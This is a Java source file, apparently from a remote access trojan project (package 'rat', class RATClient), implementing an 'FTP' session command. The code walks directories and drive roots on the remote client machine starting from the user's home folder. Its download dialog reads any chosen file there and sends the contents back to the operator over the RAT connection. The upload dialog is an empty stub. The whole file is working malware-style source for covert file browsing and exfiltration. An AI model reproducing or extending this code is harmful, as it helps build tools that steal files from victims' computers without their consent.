package main.java.rat.command.clientCommands;

import main.java.rat.Utils;
import main.java.rat.client.RATClient;
import main.java.rat.command.ClientCommand;
import main.java.rat.command.SessionCommand;
import main.java.rat.models.FileSocketMessage;

import java.io.*;
import java.nio.file.Path;
import java.nio.file.Paths;

interface Dialog {
    void receivedInput(String command);
    boolean isOver();

    void start(ClientFTPCommand FTPCommand, RATClient environment);
}

class DownloadDialog implements Dialog {

    private RATClient environment;
    private ClientFTPCommand FTPCommand;
    private File fileToDownload;
    private File dirToUpload;
    private boolean finished = false;

    @Override
    public void receivedInput(String command) {
        if(command.equalsIgnoreCase("exit")) {
            finished = true;
            return;
        }
        String defaultDownloadDir = System.getProperty("user.home") + "/Downloads/";
        if(fileToDownload == null) {
            Path filePath = Paths.get(FTPCommand.currentDir.getAbsolutePath(), command);
            File file = new File(filePath.toString());
            if(!file.exists()) {
                FTPCommand.getLogger().log("File not found, please retry");
                return;
            };
            fileToDownload = file;
            FTPCommand.getLogger().log("Please enter directory to download the file to " +
                    "(empty for '"+defaultDownloadDir+"')");
        } else if(dirToUpload == null) {
            command = command.isEmpty() ? defaultDownloadDir : command;
            if(!(new File(command)).isDirectory()) {
                FTPCommand.getLogger().log("Directory not found, please retry");
                return;
            }
            dirToUpload = new File(command);
            FTPCommand.getLogger().log("Download starting...");
        }

        if(dirToUpload != null && fileToDownload != null) {
            FileSocketMessage fileMessage = new FileSocketMessage();
            fileMessage.fileName = fileToDownload.getName();
            fileMessage.destination = dirToUpload.getAbsolutePath();
            fileMessage.origin = fileToDownload.getAbsolutePath();

            try {
                FileInputStream fileInputStream = new FileInputStream(fileToDownload);
                byte[] fileContent = new byte[(int) fileToDownload.length()];
                BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream);
                bufferedInputStream.read(fileContent, 0, fileContent.length);
                fileMessage.setContent(fileContent);
            } catch (IOException e) {
                FTPCommand.getLogger().log(e.getMessage());
                e.printStackTrace();
            }

            environment.sendMessage(fileMessage);
            finished = true;
        }
    }

    @Override
    public boolean isOver() {
        return finished;
    }

    @Override
    public void start(ClientFTPCommand FTPCommand, RATClient environment) {
        this.FTPCommand = FTPCommand;
        this.environment = environment;

        FTPCommand.getLogger().log("Please type the name of the file you wish to download (on remote client) ('exit' to exit)");
    }
}

class UploadDialog implements Dialog {

    private RATClient environment;
    private ClientFTPCommand FTPCommand;

    @Override
    public void receivedInput(String command) {

    }

    @Override
    public boolean isOver() {
        return false;
    }

    @Override
    public void start(ClientFTPCommand FTPCommand, RATClient environment) {
        this.FTPCommand = FTPCommand;
        this.environment = environment;

        FTPCommand.getLogger().log("Please type the path of file to upload (on this local server)");
    }
}


public class ClientFTPCommand extends ClientCommand implements SessionCommand {
    boolean inSession = false;
    File currentDir = null;
    private Dialog dialog = null;

    @Override
    public String getMainCommandName() {
        return "FTP";
    }

    @Override
    public String getHelpText() {
        return "Start FTP session, where files can be listed, downloaded or uploaded. 'exit' can be used to exit.";
    }

    @Override
    public String getExtendedHelpText() {
        return getHelpText() + "\n" + usageText();
    }

    private String usageText() {
        return "Usage while in FTP:\n" +
                "'cd ../' - change directory, in this case up\n" +
                "'cd folder' - change directory, in this inside a folder\n" +
                "'root' - List root path's (installed drives in windows)\n" +
                "'root [root]' - change to chosen root\n" +
                "'download' - open the download dialog\n" +
                "'upload' - open the upload dialog\n" +
                "'exit' - exit FTP session";
    }

    @Override
    public boolean executeCommand() {
        logger.log(usageText()+"\n");
        currentDir = new File(System.getProperty("user.home"));
        inSession = true;
        environment.state.setInSession(true);

        listFiles();

        return true;
    }

    private void listFiles() {
        logger.log(currentDir.getAbsolutePath());
        for(File file : currentDir.listFiles()) {
            logger.log("\t"+
                    (file.isDirectory() ? "DIRECTORY" : "FILE, " +
                            Utils.readableByteSize(file.length())) + "\t"+
                    file.getName()
            );
        }
    }

    @Override
    public String getExitString() {
        return "exit";
    }

    @Override
    public void receivedInput(String command) {
        if(dialog != null) {
            dialog.receivedInput(command);
            if(dialog.isOver()) {
                dialog = null;
                logger.log(currentDir.getAbsolutePath());
            }
            return;
        }

        if(command.toLowerCase().indexOf("cd ") == 0) {
            String dir = command.replace("cd ", "");

            Path filePath = Paths.get(currentDir.getAbsolutePath(), dir);

            try {
                String normalPath = (new File(filePath.toString())).getCanonicalPath();
                File newDir = new File(normalPath);
                if(!newDir.exists()) {
                    logger.log("'"+dir+"' does not exist!");
                    return;
                }
                currentDir = newDir;

                listFiles();
            } catch (IOException e) {
                logger.log(e.getMessage());
                e.printStackTrace();
            }

        } else if(command.equalsIgnoreCase("root")) {
            logger.log("Root locations");

            for (File file : File.listRoots()) {
                logger.log("\t" + file.getPath());
            }

        } else  if(command.toLowerCase().indexOf("root ") == 0) {

            String newRoot = command.replace("root ", "");
            for (File file : File.listRoots()) {
                if(file.getPath().equalsIgnoreCase(newRoot)) {
                    currentDir = new File(newRoot);
                    listFiles();
                    return;
                }
            }

            logger.log("invalid root, use 'root' to list all roots");


        } else if(command.equalsIgnoreCase("download")) {
            dialog = new DownloadDialog();
            dialog.start(this, environment);

        } else if(command.equalsIgnoreCase("upload")) {
            dialog = new UploadDialog();
            dialog.start(this, environment);

        } else {
            logger.log("invalid command, usage:\n" + usageText());
        }



    }

    @Override
    public boolean isInSession() {
        return inSession;
    }

    @Override
    public void exit() {
        inSession = false;
        environment.state.setInSession(false);
        logger.log("Exiting FTP...");
    }
}
